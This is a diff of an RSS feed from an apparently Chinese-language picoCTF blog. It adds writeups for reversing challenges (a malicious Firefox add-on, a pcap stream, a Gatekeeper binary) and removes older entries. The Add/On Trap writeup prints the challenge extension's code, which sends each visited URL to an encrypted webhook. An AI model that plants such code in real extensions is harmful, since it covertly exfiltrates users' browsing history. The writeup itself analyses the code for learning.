@@ -12,12 +12,146 @@
     
     <copyright>本部落格所有文章除特別聲明外，均採用 BY-NC-SA 授權協議。轉載請註明出處！</copyright>
     
-    <lastBuildDate>Mon, 11 May 2026 13:30:52 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 25 Aug 2026 15:30:52 +0800</lastBuildDate>
     
     
     <atom:link href="http://localhost:1313/tags/reverse/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>The Add/On Trap writeup</title>
+      <link>http://localhost:1313/post/the_add_on_trap/</link>
+      <pubDate>Tue, 25 Aug 2026 14:54:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/the_add_on_trap/</guid>
+      <description>
+        <![CDATA[<h1>The Add/On Trap writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="解壓縮題目給的xpi檔">
+<a class="header-anchor" href="#%e8%a7%a3%e5%a3%93%e7%b8%ae%e9%a1%8c%e7%9b%ae%e7%b5%a6%e7%9a%84xpi%e6%aa%94"></a>
+解壓縮題目給的.xpi檔
+</h2><p><img src="/images/The_Add_On_Trap/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><p>查看每一個檔案,在background/main.js中發現可疑的程式碼</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Secret</span> <span class="n">key</span> <span class="n">must</span> <span class="n">be</span> <span class="mi">32</span> <span class="n">url</span><span class="o">-</span><span class="n">safe</span> <span class="n">base64</span><span class="o">-</span><span class="n">encoded</span> <span class="n">bytes</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">TODO</span> <span class="n">I</span> <span class="n">must</span> <span class="n">find</span> <span class="n">a</span> <span class="n">solution</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">the</span> <span class="n">key</span> <span class="n">from</span> <span class="n">here</span><span class="p">,</span> <span class="k">for</span> <span class="n">now</span> <span class="n">I</span><span class="s1">&#39;ll leave it there because I need it to encrypt the webhook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">logOnCompleted</span><span class="p">(</span><span class="n">details</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Information</span> <span class="n">to</span> <span class="n">exfiltrate</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">webhookUrl</span><span class="o">=</span><span class="s1">&#39;gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span><span class="p">:</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fetch</span><span class="p">(</span><span class="n">webhookUrl</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span><span class="p">:</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">204</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="err">`</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">the</span> <span class="n">extraction</span><span class="o">!</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">browser</span><span class="o">.</span><span class="n">webNavigation</span><span class="o">.</span><span class="n">onCompleted</span><span class="o">.</span><span class="n">addListener</span><span class="p">(</span><span class="n">logOnCompleted</span><span class="p">);</span>
+</span></span></code></pre></div><p>其中<code>const key=&quot;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&quot;</code>明顯是base64加密,我們把它進行解密
+<img src="/images/The_Add_On_Trap/2.webp" alt="image">
+取得了一個假的flag</p>
+        
+        <hr><p>本文2026-08-25首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-25</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>Silent Stream writeup</title>
+      <link>http://localhost:1313/post/silent_stream/</link>
+      <pubDate>Tue, 18 Aug 2026 22:31:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/silent_stream/</guid>
+      <description>
+        <![CDATA[<h1>Silent Stream writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="將題目的pcap檔的data提取出來">
+<a class="header-anchor" href="#%e5%b0%87%e9%a1%8c%e7%9b%ae%e7%9a%84pcap%e6%aa%94%e7%9a%84data%e6%8f%90%e5%8f%96%e5%87%ba%e4%be%86"></a>
+將題目的pcap檔的data提取出來
+</h2><h3 id="使用wireshark">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8wireshark"></a>
+使用wireshark
+</h3><p><img src="/images/Silent_Stream/1.webp" alt="image"></p>
+<h3 id="提取資料">
+<a class="header-anchor" href="#%e6%8f%90%e5%8f%96%e8%b3%87%e6%96%99"></a>
+提取資料
+</h3><p>發現他都是10.10.10.10-&gt;10.10.10.11的tcp封包,且好像是同一個session,<br>
+因此我們隨便點一個封包,右鍵-&gt;Follow-&gt;TCP Stream
+<img src="/images/Silent_Stream/2.webp" alt="image">
+Show as 選擇Raw,按save as
+<img src="/images/Silent_Stream/3.webp" alt="image">
+儲存成stream.bin
+<img src="/images/Silent_Stream/4.webp" alt="image"></p>
+        
+        <hr><p>本文2026-08-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-18</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>Gatekeeper writeup</title>
+      <link>http://localhost:1313/post/gatekeeper/</link>
+      <pubDate>Tue, 11 Aug 2026 16:39:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/gatekeeper/</guid>
+      <description>
+        <![CDATA[<h1>Gatekeeper writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="用ida-逆向題目">
+<a class="header-anchor" href="#%e7%94%a8ida-%e9%80%86%e5%90%91%e9%a1%8c%e7%9b%ae"></a>
+用IDA 逆向題目
+</h2><p>逆向main函數
+<img src="/images/gatekeeper/1.webp" alt="image">
+逆向reveal_flag函數
+<img src="/images/gatekeeper/2.webp" alt="image"></p>
+<h2 id="解題方法">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%96%b9%e6%b3%95"></a>
+解題方法
+</h2><p>根據逆向結果,進入reveal_flag條件為：</p>
+<ol>
+<li>大於999</li>
+<li>小於9999</li>
+<li>位數等於3
+因此用普通的十進位無法進入，我們可以用十六進位(FFF)來進入該函數
+接著會取得被翻轉並加料的flag,我們利用python腳本還原</li>
+</ol>
+<h2 id="取得被翻轉並加料的flag">
+<a class="header-anchor" href="#%e5%8f%96%e5%be%97%e8%a2%ab%e7%bf%bb%e8%bd%89%e4%b8%a6%e5%8a%a0%e6%96%99%e7%9a%84flag"></a>
+取得被翻轉並加料的flag
+</h2><p>輸入FFF
+<img src="/images/gatekeeper/3.webp" alt="image"></p>
+        
+        <hr><p>本文2026-08-11首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-11</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
     
     
 
@@ -221,109 +355,6 @@ What is  .htaccess?
 <strong>發現程式有一個字串組合</strong></p>
         
         <hr><p>本文2026-04-20首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-04-20</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>Hidden Cipher 2 writeup</title>
-      <link>http://localhost:1313/post/hidden_cipher_2/</link>
-      <pubDate>Sat, 18 Apr 2026 11:00:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/hidden_cipher_2/</guid>
-      <description>
-        <![CDATA[<h1>Hidden Cipher 2 writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="下載題目檔案並解壓縮">
-<a class="header-anchor" href="#%e4%b8%8b%e8%bc%89%e9%a1%8c%e7%9b%ae%e6%aa%94%e6%a1%88%e4%b8%a6%e8%a7%a3%e5%a3%93%e7%b8%ae"></a>
-下載題目檔案並解壓縮
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">wget https://challenge-files.picoctf.net/c_crystal_peak/c7f9577a9dc6a571ae25ca36c6158841b1678576557bbc2be59b33b4f67b8cf9/hiddencipher2.zip
-</span></span><span class="line"><span class="cl">unzip hiddencipher2.zip -d hiddencipher2/
-</span></span></code></pre></div><p><img src="/images/Hidden_Cipher_2/1.webp" alt="image"></p>
-<h2 id="查看檔案">
-<a class="header-anchor" href="#%e6%9f%a5%e7%9c%8b%e6%aa%94%e6%a1%88"></a>
-查看檔案
-</h2><p><strong>查看檔案內容及類型</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">cat flag.txt
-</span></span><span class="line"><span class="cl">file hiddencipher2
-</span></span></code></pre></div><p><img src="/images/Hidden_Cipher_2/2.webp" alt="image">
-<strong>嘗試執行檔案</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">./hiddencipher 
-</span></span><span class="line"><span class="cl"><span class="c1"># 回答問題</span>
-</span></span></code></pre></div><p><img src="/images/Hidden_Cipher_2/3.webp" alt="image">
-<strong>得到加密flag</strong></p>
-<blockquote>
-<p>Encoded flag values:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-TEXT" data-lang="TEXT"><span class="line"><span class="cl">6720, 6300, 5940, 6660, 4020, 5040, 4200, 7380, 6120, 5820, 6420, 6060, 5700, 6120, 6480, 5820, 6180, 7500
-</span></span></code></pre></div></blockquote>
-<h2 id="使用-ida-進行靜態分析">
-<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8-ida-%e9%80%b2%e8%a1%8c%e9%9d%9c%e6%85%8b%e5%88%86%e6%9e%90"></a>
-使用 ida 進行靜態分析
-</h2><p><strong>發現程式生成一個數學題目,列印並讀取使用者輸入</strong>
-<img src="/images/Hidden_Cipher_2/4.webp" alt="image">
-<strong>發現程式比對正確答案</strong>
-<img src="/images/Hidden_Cipher_2/5.webp" alt="image">
-<strong>發現程式去開啟讀入flag.txt內容</strong>
-<img src="/images/Hidden_Cipher_2/6.webp" alt="image">
-<strong>發限有一個encode_flag的函數,要對flag加密</strong>
-<img src="/images/Hidden_Cipher_2/7.webp" alt="image">
-<strong>發限有一個encode_flag的函數,用數學題答案對flag進行相乘加密</strong>
-<img src="/images/Hidden_Cipher_2/8.webp" alt="image"></p>
-        
-        <hr><p>本文2026-04-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-04-20</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>Gatekeeper writeup</title>
-      <link>http://localhost:1313/post/gatekeeper/</link>
-      <pubDate>Mon, 20 Apr 2026 12:39:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/gatekeeper/</guid>
-      <description>
-        <![CDATA[<h1>Gatekeeper writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          
-        
-        <hr><p>本文2026-04-20首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-04-15</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>vault-door-training writeup</title>
-      <link>http://localhost:1313/post/vault-door-training_writeup/</link>
-      <pubDate>Wed, 15 Apr 2026 10:05:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/vault-door-training_writeup/</guid>
-      <description>
-        <![CDATA[<h1>vault-door-training writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="下載題目相關檔案">
-<a class="header-anchor" href="#%e4%b8%8b%e8%bc%89%e9%a1%8c%e7%9b%ae%e7%9b%b8%e9%97%9c%e6%aa%94%e6%a1%88"></a>
-下載題目相關檔案
-</h2><p><strong>下載VaultDoorTraining.java</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wget https://challenge-files.picoctf.net/c_fickle_tempest/d7b689cc9023793c28c50d477d174931581f04eee4a8b7de4bb6162e50b89fe1/VaultDoorTraining.java
-</span></span></code></pre></div><h2 id="使用ide開啟檔案查看">
-<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8ide%e9%96%8b%e5%95%9f%e6%aa%94%e6%a1%88%e6%9f%a5%e7%9c%8b"></a>
-使用IDE開啟檔案查看
-</h2><p><strong>使用 intelliJ 開啟VaultDoorTraining.java</strong>
-<img src="/images/vault-door-training/6.webp" alt="image"></p>
-        
-        <hr><p>本文2026-04-15首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-04-15</p>]]>
       </description>
       
         <category>picoctf</category>
